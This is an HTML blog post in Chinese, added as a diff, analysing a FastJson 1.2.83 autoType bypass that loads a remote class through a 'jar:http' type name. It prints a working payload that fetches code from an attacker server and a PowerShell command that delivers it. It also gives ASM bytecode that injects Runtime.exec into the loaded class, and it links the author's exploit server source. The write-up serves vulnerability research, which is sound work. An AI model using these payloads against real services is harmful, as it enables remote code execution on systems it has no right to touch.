@@ -1,0 +1,593 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>java安全-FastJson1.2.83绕过 | 十七.</title><meta name="author" content="十七."><meta name="copyright" content="十七."><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="FastJson反序列化漏洞研究，这里主要研究的是Fastjson1.2.83绕过的原理，顺便探索了一下最小影响版本fastjson1.2.37">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java安全-FastJson1.2.83绕过">
+<meta property="og:url" content="https://zc-18.github.io/2026/08/20/fastjson04/index.html">
+<meta property="og:site_name" content="十七.">
+<meta property="og:description" content="FastJson反序列化漏洞研究，这里主要研究的是Fastjson1.2.83绕过的原理，顺便探索了一下最小影响版本fastjson1.2.37">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zc-18.github.io/img/covers/cover-31.webp">
+<meta property="article:published_time" content="2026-08-20T10:00:01.000Z">
+<meta property="article:modified_time" content="2026-08-27T03:19:08.796Z">
+<meta property="article:author" content="十七.">
+<meta property="article:tag" content="FastJson">
+<meta property="article:tag" content="java安全">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://zc-18.github.io/img/covers/cover-31.webp"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "java安全-FastJson1.2.83绕过",
+  "url": "https://zc-18.github.io/2026/08/20/fastjson04/",
+  "image": "https://zc-18.github.io/img/covers/cover-31.webp",
+  "datePublished": "2026-08-20T10:00:01.000Z",
+  "dateModified": "2026-08-27T03:19:08.796Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "十七.",
+      "url": "https://zc-18.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608052117982.ico"><link rel="canonical" href="https://zc-18.github.io/2026/08/20/fastjson04/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="stylesheet" href="/css/index.css?v=5.5.3-b2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?e6047011fc3df8f4b86d7847de988e6d";
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+})();
+btf.addGlobalFn('pjaxComplete', () => {
+  _hmt.push(['_trackPageview',window.location.pathname])
+}, 'baidu_analytics')
+</script><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@700&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":false,"highlightLang":false,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'java安全-FastJson1.2.83绕过',
+  isHighlightShrink: undefined,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="preload" as="font" type="font/woff2" href="/fonts/lxgw/regular-00.woff2" crossorigin><link rel="preload" as="font" type="font/woff2" href="/fonts/lxgw/medium-00.woff2" crossorigin><link rel="stylesheet" href="/css/fonts-lxgw.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Fira+Code:wght@400;500;600&display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="/css/background.css"><link rel="stylesheet" href="/css/claude-article.css"><link rel="stylesheet" href="/css/claude-pages.css"><link rel="stylesheet" href="/css/ai-assistant.css"><script>(function(){try{if(!window.matchMedia('(prefers-reduced-motion:reduce)').matches){var d=document.documentElement;d.classList.add('cl-motion');setTimeout(function(){if(!window.__clMotion)d.classList.remove('cl-motion')},4000)}}catch(e){}})()</script><link rel="stylesheet" href="/css/claude-motion.css"><meta name="generator" content="Hexo 8.1.1"></head><body><div id="loading-box"><div class="gear-loader"><div class="gear-loader_overlay"></div><div class="gear-loader_cogs"><div class="gear-loader_cogs__top"><div class="gear-top_part"></div><div class="gear-top_part"></div><div class="gear-top_part"></div><div class="gear-top_hole"></div></div><div class="gear-loader_cogs__left"><div class="gear-left_part"></div><div class="gear-left_part"></div><div class="gear-left_part"></div><div class="gear-left_hole"></div></div><div class="gear-loader_cogs__bottom"><div class="gear-bottom_part"></div><div class="gear-bottom_part"></div><div class="gear-bottom_part"></div><div class="gear-bottom_hole"></div></div></div></div></div><script>(() => {
+  const box = document.getElementById('loading-box')
+  const body = document.body
+
+  let start = Date.now() // 动画开始时间
+
+  const end = () => {
+    const elapsed = Date.now() - start
+    const minDelay = Math.max(0, 1000 - elapsed) // 保证最少 1 秒
+
+    setTimeout(() => {
+      body.style.overflow = ''
+      box.classList.add('loaded')
+    }, minDelay)
+  }
+
+  // ===== 最多 3 秒强制结束 =====
+  const maxTimer = setTimeout(end, 3000)
+
+  // 页面加载完结束
+  if (document.readyState === 'complete') {
+    clearTimeout(maxTimer)
+    end()
+  } else {
+    window.addEventListener('load', () => {
+      clearTimeout(maxTimer)
+      end()
+    })
+  }
+
+  // ===== PJAX 支持 =====
+  if (true) {
+    btf.addGlobalFn(
+      'pjaxSend',
+      () => {
+        body.style.overflow = 'hidden'
+        box.classList.remove('loaded')
+        start = Date.now() // 重新计时
+        clearTimeout(maxTimer)
+        setTimeout(end, 3000) // PJAX 同样最多 3 秒
+      },
+      'gear_init'
+    )
+    btf.addGlobalFn('pjaxComplete', () => {
+      clearTimeout(maxTimer)
+      end()
+    }, 'gear_end')
+  }
+})()</script><div class="bg-animation" id="web_bg" style="background-color: #efefef;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan2.jpg" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">55</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/covers/cover-31.webp);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608052117982.ico" alt="Logo"><span class="site-name">十七.</span></a><a class="nav-page-title" href="/"><span class="site-name">java安全-FastJson1.2.83绕过</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">java安全-FastJson1.2.83绕过</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-08-20T10:00:01.000Z" title="发表于 2026-08-20 18:00:01">2026-08-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-08-27T03:19:08.796Z" title="更新于 2026-08-27 11:19:08">2026-08-27</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/FastJson/">FastJson</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>14分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="FastJson1-2-83绕过"><a href="#FastJson1-2-83绕过" class="headerlink" title="FastJson1.2.83绕过"></a>FastJson1.2.83绕过</h1><p><code>Fastjson</code>版本列表网址如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://central.sonatype.com/artifact/com.alibaba/fastjson/versions</span><br></pre></td></tr></table></figure>
+
+<p>2022-06-13 阿里巴巴官方发布<code>1.2.83</code>修复了<code>CVE-2022-25845</code>也就是使用<code>Throwable</code>绕过<code>AutoType</code>，同时，这一版本也作为<code>Fastjson 1</code>系列的终结之作，开始全新制作<code>Fastjson 2</code>系列</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608191435788.png" alt="image-20260819143519457"></p>
+<p>当然也就很轻易意识到<code>1.2.83</code>被绕过了，也就是我在这篇文章研究的重点</p>
+<h2 id="一、绕过"><a href="#一、绕过" class="headerlink" title="一、绕过"></a>一、绕过</h2><p>此次修复对应cve标号为<code>CVE-2026-16723</code></p>
+<p>2026-07-21 FearsOff 公司发布</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://fearsoff.org/research/fastjson-1-2-83-rce</span><br></pre></td></tr></table></figure>
+
+<p>也算是第一个披露这个吧</p>
+<p>alibaba 公告</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/alibaba/fastjson2/wiki/Security-Advisory:-Remote-Code-Execution-in-fastjson-1.2.68%E2%80%931.2.83</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608191544457.png" alt="image-20260819154406360"></p>
+<h3 id="1-复现"><a href="#1-复现" class="headerlink" title="1.复现"></a>1.复现</h3><p>目标需要是一个<code>fat jar</code>启动的程序而不是单纯类路径</p>
+<p>攻击方也需要有服务器将恶意类挂载到监听端口</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608192021102.7z</span><br></pre></td></tr></table></figure>
+
+<p>这个是我实现的服务器与攻击端源码</p>
+<p>环境方面</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JDK 8u65</span><br><span class="line">目标使用 fat-JAR</span><br><span class="line">FastJSON 是 1.2.83以及以下</span><br></pre></td></tr></table></figure>
+
+<p>二者启动之后，使用<code>payload</code>去访问对应接口就可以触发</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608192046650.png" alt="image-20260819204632428"></p>
+<p><strong>注意点</strong></p>
+<p>1.需要直接去调用</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">body = <span class="string">&#x27;&#123;&quot;@type&quot;:&quot;jar:http:..2130706433:9000.probe!.POC&quot;,&quot;x&quot;:1&#125;&#x27;</span></span></span><br><span class="line">Invoke-RestMethod `</span><br><span class="line">-Uri http://127.0.0.1:8080/parse-async `</span><br><span class="line">-Method Post `</span><br><span class="line">-ContentType &#x27;application/json&#x27; `</span><br><span class="line">-Body $body</span><br></pre></td></tr></table></figure>
+
+<p>这个接口，如果先调用<code>/info 或 /parse</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. /parse 首次访问 ParserConfig.global；</span><br><span class="line">2. ASMClassLoader 永久绑定到 TomcatEmbeddedWebappClassLoader；</span><br><span class="line">3. /parse-async 虽然切换了 TCCL；</span><br><span class="line">4. POC 已经加载成功，但 FastjsonASMDeserializer_1_POC.createInstance() 生成的 new POC 仍由旧的 ASM loader 解析；</span><br><span class="line">5. 会出现：</span><br><span class="line">  NoClassDefFoundError</span><br><span class="line">  Caused by: ClassNotFoundException</span><br></pre></td></tr></table></figure>
+
+<p>2.想要实现命令执行</p>
+<p>在<code>src/main/java/lab/attacker/CraftedProbeGenerator.java</code>下加入</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">initializer.visitMethodInsn(</span><br><span class="line">        Opcodes.INVOKESTATIC,</span><br><span class="line">        <span class="string">&quot;java/lang/Runtime&quot;</span>,</span><br><span class="line">        <span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">        <span class="string">&quot;()Ljava/lang/Runtime;&quot;</span>,</span><br><span class="line">        <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">initializer.visitLdcInsn(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">initializer.visitMethodInsn(</span><br><span class="line">        Opcodes.INVOKEVIRTUAL,</span><br><span class="line">        <span class="string">&quot;java/lang/Runtime&quot;</span>,</span><br><span class="line">        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">        <span class="string">&quot;(Ljava/lang/String;)Ljava/lang/Process;&quot;</span>,</span><br><span class="line">        <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
+
+<p>3.切换攻击服务器类之后攻击失败</p>
+<p>需要重新启动一下目标程序，因为之前的请请求已经打入缓存里</p>
+<h3 id="2-黑名单绕过"><a href="#2-黑名单绕过" class="headerlink" title="2.黑名单绕过"></a>2.黑名单绕过</h3><p><code>checkAutoType</code>函数第一段</p>
+<p>字串</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;jar:http:..2130706433:9000.probe!.POC&quot;</span><span class="punctuation">,</span><span class="attr">&quot;x&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>当匹配到<code>@type</code>时</p>
+<p>进入到加载类阶段，也就是<code>DefaultJSONParser#parseObject</code></p>
+<p>然后会进入类加载检查函数 <code>checkAutoType</code>，这个就是这里研究的重点</p>
+<p>类名也就是<code>typeName</code>为<code>jar:http:..2130706433:9000.probe!.POC</code>这样，肯定不会被黑名单匹配到，也就是没有黑白名单匹配的烦恼</p>
+<p>然后就进到了重要的绕过逻辑</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608201709370.png" alt="image-20260820170949037"></p>
+<h4 id="2-1、获取类名"><a href="#2-1、获取类名" class="headerlink" title="2.1、获取类名"></a>2.1、获取类名</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">resource</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>) + <span class="string">&quot;.class&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>逻辑就是将<code>typeName</code>中的.号用&#x2F;替代我们的<code>payload</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar:http:..2130706433:9000.probe!.POC</span><br></pre></td></tr></table></figure>
+
+<p>经过转换之后就是</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar:http://2130706433:9000/probe!/POC.class</span><br></pre></td></tr></table></figure>
+
+<p>2130706433 是 127.0.0.1 地址的<strong>十进制整数表示</strong></p>
+<h4 id="2-2、数据流进入"><a href="#2-2、数据流进入" class="headerlink" title="2.2、数据流进入"></a>2.2、数据流进入</h4><p>因为<code>defaultClassLoader</code> 通常是 null，所以走下面一条方式</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">is = ParserConfig.class.getClassLoader()</span><br><span class="line">          .getResourceAsStream(resource);</span><br></pre></td></tr></table></figure>
+
+<p>本质上就是</p>
+<p>拿到<code>ParserConfig</code>类的类加载器，接着调用其<code>getResourceAsStream</code>方法</p>
+<p>规定目标必须时<code>fat-JAR</code>启动</p>
+<p>所以 <code>ParserConfig.class.getClassLoader()</code> 是：</p>
+<p>org.springframework.boot.loader.LaunchedURLClassLoader</p>
+<p>这个类的继承关系如下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608201719390.png" alt="image-20260820171934316"></p>
+<p><code>LaunchedURLClassLoader</code>类中没有定义<code>getResourceAsStream</code>方法，所以会调用父类重写的<code>getResourceAsStream</code>方法</p>
+<p>具体逻辑如下</p>
+<p><code>java/net/URLClassLoader#getResourceAsStream</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608201751824.png" alt="image-20260820175124685"></p>
+<p>此时还有一个细节</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar:http://2130706433:9000/probe!/POC.class</span><br></pre></td></tr></table></figure>
+
+<p>符合</p>
+<p><code>jar:&lt;外层 JAR URL&gt;!/&lt;JAR 内部条目&gt;</code></p>
+<p>也就是</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">外层 JAR URL = http://2130706433:9000/probe</span><br><span class="line">内部条目     = POC.class</span><br></pre></td></tr></table></figure>
+
+<p>所以请求的是<code>/probe</code>获取到<code>probe.jar</code>，然后再返回<code>poc.class</code></p>
+<p><strong>具体代码逻辑如下</strong></p>
+<p><strong>将<code>jar:http://2130706433:9000/probe!/POC.class</code>拆分具体逻辑</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url.openConnection()</span><br><span class="line">└─ jar Handler.openConnection()</span><br><span class="line"> └─ new sun.net.www.protocol.jar.JarURLConnection(url, handler)</span><br><span class="line">    └─ super(url)</span><br><span class="line">       └─ java.net.JarURLConnection.parseSpecs(url)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608201900890.png" alt="image-20260820185947888"></p>
+<p>具体拆分函数</p>
+<p><code>java/net/JarURLConnection#parseSpecs</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="C:\Users\32768\AppData\Roaming\Typora\typora-user-images\image-20260820190223404.png" alt="image-20260820190223404"></p>
+<p><strong>发起请求去下载保存probe.jar代码逻辑</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608201823106.png" alt="image-20260820182339978"></p>
+<p>接着是具体发起网络请求</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608201832594.png" alt="image-20260820183236474"></p>
+<p><strong>分解恶意类<code>poc.class</code>具体逻辑</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608201836491.png" alt="image-20260820183642413"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608201836018.png" alt="image-20260820183622930"></p>
+<p>也就是这样</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608201840858.png" alt="image-20260820184005699"></p>
+<p>至此，第二点完毕，也就是返回了恶意服务器上的<code>poc.class</code>恶意类数据流</p>
+<h4 id="2-3、包装ClassReader"><a href="#2-3、包装ClassReader" class="headerlink" title="2.3、包装ClassReader"></a>2.3、包装<code>ClassReader</code></h4><p>Fastjson 使用的是自己的轻量 ASM，<code>com.alibaba.fastjson.asm.ClassReade</code></p>
+<p><strong>ASM</strong> 就是一个 Java 字节码操作和分析框架，用来在<strong>字节码层面</strong>直接读取、生成、修改 <code>.class</code> 文件，而不是操作 Java 源码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassReader</span> <span class="variable">classReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(is, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
+
+<p>作用就是</p>
+<p>去将<code>is</code>也就是加载到的<code>poc.class</code>类消费处理</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608201936167.png" alt="image-20260820193633069"></p>
+<h4 id="2-4、匹配注解"><a href="#2-4、匹配注解" class="headerlink" title="2.4、匹配注解"></a>2.4、匹配注解</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TypeCollector</span> <span class="variable">visitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TypeCollector</span>(<span class="string">&quot;&lt;clinit&gt;&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>是为了匹配方法名，并不会在这里执行静态初始化代码</p>
+<p>表示</p>
+<p>  目标方法名：<clinit><br>  目标参数数量：0</p>
+<p>本质就是无参构造方法，这里的作用就是保存一个匹配条件，为下一步做准备</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">classReader.accept(visitor);</span><br></pre></td></tr></table></figure>
+
+<p>具体逻辑</p>
+<p>第一步</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608202007430.png" alt="image-20260820200748361"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608202010820.png" alt="image-20260820201008750"></p>
+<p>所以我们在编写poc类的时候特意为添加条件注解</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">writer.visitAnnotation(</span><br><span class="line">  <span class="string">&quot;Lcom/alibaba/fastjson/annotation/JSONType;&quot;</span>,</span><br><span class="line">  <span class="literal">true</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>同时注意<code>accept</code>函数还判断了 <code>readAnnotations</code>是否存在才走的下一步，而这个参数刚好在包装是被赋值为<code>True</code></p>
+<p>至此，黑名单绕过的投毒实现完毕</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608202014559.png" alt="image-20260820201444463"></p>
